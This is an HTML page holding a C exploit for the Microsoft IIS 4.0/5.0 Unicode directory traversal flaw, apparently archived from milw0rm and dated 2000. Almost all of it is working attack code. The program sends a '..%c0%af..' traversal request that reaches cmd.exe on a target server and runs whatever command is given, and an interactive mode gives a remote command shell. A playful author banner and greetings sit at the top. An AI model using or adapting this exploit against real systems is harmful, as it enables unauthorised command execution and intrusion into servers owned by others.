<html><head><title>MS Windows IIS Unicode Remote Transversal Bug (2)</title></head><pre>/****************************************************************************\
**                                                                          **
**    Microsoft IIS 4.0/5.0 Extended UNICODE Directory Traversal Exploit    **
**      proof of theory exploit cuz it's wednesday and i'm on the couch     **
**                                                                          **
**       brought to you by the letter B, the number 7, optyx, and t12       **
**          optyx - &lt;optyx@uberhax0r.net optyx@newhackcity.net&gt;             **
**          t12 - &lt;t12@uberhax0r.net&gt;                                       **
**                                                                          **
**     greetz go out to aempirei, a gun toatin' gangstah' hustler' player   **
**     motherfucker who isn't with us anymore, miah, who's GTA2 game was    **
**     was most entertaining tonight, Cathy, who provided the trippy light  **
**     to stare at, and to KT, for providing me with hours of decent        **
**     conversation.                                                        **
**                                                                          **
\****************************************************************************/

#include &lt;stdio.h&gt;
#include &lt;netdb.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;signal.h&gt;
#include &lt;errno.h&gt;
#include &lt;fcntl.h&gt;

void usage(void) 
{
 fprintf(stderr, &quot;usage: ./iis-zank &lt;-t target&gt; &lt;-c 'command' or -i&gt;&quot;); 
 fprintf(stderr, &quot; [-p port] [-t timeout]\n&quot;); 
 exit(-1);
}

int main(int argc, char **argv) 
{
 int i, j;
 int port=80;
 int timeout=3;
 int interactive=0;
 char temp[1];
 char host[512]=&quot;&quot;; 
 char cmd[1024]=&quot;&quot;;
 char request[8192]=&quot;GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+&quot;;
 struct hostent *he;
 struct sockaddr_in s_addr;

 printf(&quot;iis-zank_bread_chafer_8000_super_alpha_hyper_pickle.c\n&quot;);
 printf(&quot;by optyx and t12\n&quot;);

 for(i=0;i&lt;argc;i++) 
	{ if(argv[i][0] == '-') {
		 for(j=1;j&lt;strlen(argv[i]);j++) 
		 	{
			 switch(argv[i][j]) 
			 	{
				 case 't':
				 	strncpy(host, argv[i+1], sizeof(host));
				 	break;
				 case 'c':
				 	strncpy(cmd, argv[i+1], sizeof(cmd));
				 	break;
				 case 'h':
				 	usage();
			 	 	break;
				 case 'o':
					timeout=atoi(argv[i+1]); 
				 	break;
				 case 'p':
				 	port=atoi(argv[i+1]);
				 	break;
				 case 'i':
				 	interactive=1;
				 	break;
				 default:
				 break;
				}
			}
		}
	}

 if(!strcmp(host, &quot;&quot;)) 
	{
	 fprintf(stderr, &quot;specify target host\n&quot;);
	 usage();
	}

 if(!strcmp(cmd, &quot;&quot;) &amp;&amp; !interactive) 
	{
	 fprintf(stderr, &quot;specify command to execute\n&quot;);
	 usage();
	}

 printf(&quot;]- Target - %s:%d\n&quot;, host, port);
 if(!interactive)
 	 printf(&quot;]- Command - %s\n&quot;, cmd);
 printf(&quot;]- Timeout - %d seconds\n&quot;, timeout);
 if((he=gethostbyname(host)) == NULL) 
	{
 	 fprintf(stderr, &quot;invalid target\n&quot;);
	 usage();
	}

 do
 	{

	 if(interactive)
	 	 {
		  cmd[0]=0;
		  printf(&quot;\nC&gt; &quot;);
		  if(fgets(cmd, sizeof(cmd), stdin) == NULL)
		  	  fprintf(stderr, &quot;gets() error\n&quot;); 
		  cmd[strlen(cmd)-1]='\0';
		  if(!strcmp(&quot;exit&quot;, cmd))
		  	  exit(-1);
		 }

 	 for(i=0;i&lt;strlen(cmd);i++) 
		 {
	 	  if(cmd[i]==' ')
		  	cmd[i]='+';
		 }

	 strncpy(request, 
		   &quot;GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+&quot;,
		   sizeof(request));
 	 strncat(request, cmd, sizeof(request) - strlen(request));	
 	 strncat(request, &quot;\n&quot;, sizeof(request) - strlen(request));

 	 s_addr.sin_family = PF_INET;
 	 s_addr.sin_port = htons(port);
 	 memcpy((char *) &amp;s_addr.sin_addr, (char *) he-&gt;h_addr, 
 		sizeof(s_addr.sin_addr));	

 	 if((i=socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) 
		 {
	 	  fprintf(stderr, &quot;cannot create socket\n&quot;);
	 	  exit(-1);
		 }

 	 alarm(timeout);
 	 j = connect(i, (struct sockaddr *) &amp;s_addr, sizeof(s_addr));
 	 alarm(0);

 	 if(j==-1) 
		 {
	 	  fprintf(stderr, &quot;cannot connect to %s\n&quot;, host);
	 	  exit(-1);
	 	  close(i);
		 }

	 if(!interactive)
 	 	  printf(&quot;]- Sending request: %s\n&quot;, request);

 	 send(i, request, strlen(request), 0);

	 if(!interactive)
 	 	  printf(&quot;]- Getting results\n&quot;);

 	 while(recv(i,temp,1, 0)&gt;0) 
		 {
         	  alarm(timeout);
	 	  printf(&quot;%c&quot;, temp[0]);
         	  alarm(0);
		 }	

  }
  while(interactive);

  close(i);	
  return 0;
}


// milw0rm.com [2000-11-18]</pre></html>